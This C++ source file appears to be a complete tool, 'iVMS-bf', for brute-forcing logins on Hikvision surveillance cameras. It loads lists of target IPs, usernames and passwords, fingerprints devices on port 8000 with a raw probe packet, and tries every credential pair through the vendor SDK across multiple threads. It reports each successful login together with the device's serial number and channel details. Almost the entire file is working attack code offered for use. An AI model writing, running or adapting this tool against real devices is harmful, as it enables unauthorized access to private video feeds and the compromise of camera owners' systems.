#include "../hikvision/HCNetSDK.h"

#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>

#include "argp.h"
#include "signal.h"
#include "sys/stat.h"
#include "sys/types.h"
#include "sys/socket.h"
#include "netinet/in.h"
#include "arpa/inet.h"
#include "unistd.h"


#define PRINT_EVERYTHING  (options.verbosity >= 3)
#define PRINT_RESULT      (options.verbosity >= 2)
#define PRINT_GOOD        (options.verbosity >= 1)

const char *argp_program_version = "iVMS-bf 0.1 alpha";
const char *argp_program_bug_address = "superhacker777@yandex.ru";
static char doc[] = "Description here.";
static char args_doc[] = "[FILENAME]...";
static struct argp_option arg_options[] = { 
    { "threads", 't', "COUNT", 0, "Number of threads. Default is 1."},
    { "port", 'p', "PORT_NUMBER", 0, "Camera port. You probably need 8000, so it's default value."},
    { "ips", 'i', "FILE", 0, "A file with a list of IPs." },
    { "verbose-level", 'v', "LEVEL", 0, "Define verbosity of output. 0 - silent, 1 (normal; default) - only print results, 2 (debug) - print whatever could be printed so your mom will think you're a cool."},
    { 0 }
};

struct Options {
  unsigned int    concurrency;
  unsigned int    verbosity;
  unsigned short  port;
  std::string     ips_file;
};

static Options options = {
  1,     // Concurrency
  2,     // Verbosity level
  8000   // Port
};

static std::vector<std::string> logins, passwords, ips;
static std::mutex take_sync;

static error_t parse_opt(int key, char *arg, struct argp_state *state) {
  if (state == NULL)
    return EINVAL;

  Options * arguments = static_cast<Options *>(state->input);

  switch (key) {
  case 't':
    sscanf(arg, "%u", &arguments->concurrency);
    break;
  case 'p':
    sscanf(arg, "%hu", &arguments->port);
    break;
  case 'i':
    &arguments->ips_file.assign(arg);
    break;
  case 'v':
    sscanf(arg, "%u", &arguments->verbosity);
    break;
  case ARGP_KEY_ARG:
    ips.push_back(std::string(arg));

    return 0;
  default:
    return ARGP_ERR_UNKNOWN;
  }

  return 0;
}

static struct argp argp = { arg_options, parse_opt, args_doc, doc, 0, 0, 0 };

// TODO:
//   Check for file existance.
void load_data() {
  std::ifstream file;
  std::string line;

  file.open("logins", std::ifstream::in);
  while (std::getline(file, line))
    logins.push_back(line);
  file.close();

  file.open("passwords", std::ifstream::in);
  while (std::getline(file, line))
    passwords.push_back(line);
  file.close();

  if (!options.ips_file.empty())
  {
    file.open(options.ips_file, std::ifstream::in);
    while (std::getline(file, line))
      ips.push_back(line);
    file.close();
  }
}

bool HPR_ping(const std::string host, const unsigned short port)
{
  char message[32] = {
    0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  };
  char response[16] = {0};

  int sock;
  struct sockaddr_in addr;

  sock = socket(AF_INET, SOCK_STREAM, 0);

  if (sock < 0)
  {
    std::cerr << "Can't create socket" << std::endl;
    exit(2);
  }

  struct timeval timeout;
  timeout.tv_sec = 3;
  timeout.tv_usec = 0;

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);

  // Accept only IPs. It should resolve host names too. LATER.
  inet_pton(AF_INET, host.c_str(), &(addr.sin_addr));

  if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)  
    std::cerr << "Setting timeout fail" << std::endl;

  if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
  {
    if (PRINT_EVERYTHING)
      std::cerr << "Can't connect to " << host << std::endl;

    return false;
  }

  send(sock, message, sizeof(message), 0);
  recv(sock, response, sizeof(response), 0);

  close(sock);
  
  return ((response[3] == 0x10) && (response[7] == response[11]));
}

void brute_camera(const std::string ip)
{
  if (HPR_ping(ip, 8000) == false)
  {
    if (PRINT_EVERYTHING)
      std::cout << ip << " is dead!" << std::endl;

    return;
  }

  for (const auto &login : logins)
  {
    for (const auto &password : passwords)
    {
      if (PRINT_EVERYTHING)
        std::cout << "Trying " << login << ":" << password << " for " << ip << "..." << std::endl;

      NET_DVR_DEVICEINFO device = {0};

      long user_id = NET_DVR_Login( ip.c_str(),
                                    options.port,
                                    login.c_str(),
                                    password.c_str(),
                                    &device);

      // We don't need empty devices, right?

      if (device.byChanNum > 0)
      {
        if (PRINT_GOOD)
          std::cout << "Login success: " << login << ":" << password << "@" << ip << ", "
                    << "channels: " << (int) device.byChanNum << ", "
                    << "zero_channel: " << (int) device.byStartChan << ", "
                    << "serial: \"" << device.sSerialNumber << "\", "
                    << "DVR type: " << (int) device.byDVRType << std::endl;
        
        NET_DVR_Logout(user_id);

        return;
      }
      else
      {
        if (PRINT_EVERYTHING)
          std::cout << "Login failed: " << login << ":" << password << "@" << ip << std::endl;

        // I'm not really sure if this shit is thread-safe or something.
        // I hope it is.
        // I'm a believer.
        //
        //                      |
        // READ UPD DOWN THERE \ /
        //                      V

        // int error = NET_DVR_GetLastError();

        // if (PRINT_EVERYTHING)
        //   std::cout << "Login failed. Error code: " << error << std::endl;

        // // We're not interested in spending our precious time watching dead cameras being dead.
        // // There are only two *good* error codes:
        // //
        // //   1   — invalid credentials;
        // //   152 — same shit for maybe newer firmwares, not really documented;
        // //   44  — something wrong with some buffer somewhere, but it doesn't mean that camera is dead;

        // if ((error != 1) && (error != 152))
        //   goto NextPlease;

        // UPD: there's no thread safety, eh.
      }
    }
  }
}

void bruteforce()
{
  while (true)
  {
    std::string ip;
    
    // I'm trying to be as careful as I can be.
    // Really.

    take_sync.lock();
    
    if (!ips.empty())
    {
      ip = ips.back();
      ips.pop_back();
    }
    else
    {
      take_sync.unlock();
      break;
    }

    take_sync.unlock();

    brute_camera(ip);
  }
}

void spawn_threads(unsigned int t_count)
{
  if (PRINT_EVERYTHING)
    std::cout << "Spawning " << t_count << " threads..." << std::endl;

  std::vector<std::thread> threads;
  for (unsigned int i = 0; i < t_count; i++)
    threads.push_back(std::thread(bruteforce));

  for (unsigned int i = 0; i < t_count; i++)
    threads[i].join();
}

int main(int argc, char* argv[])
{
  argp_parse(&argp, argc, argv, 0, 0, &options);

  load_data();

  if (ips.empty())
  {
    if (PRINT_RESULT)
      std::cout << "No IP has given. Nothing to do." << std::endl;

    return 0;
  }

  NET_DVR_Init();

  NET_DVR_SetRecvTimeOut(3000);

  spawn_threads(options.concurrency);

  NET_DVR_Cleanup();

  return 0;
}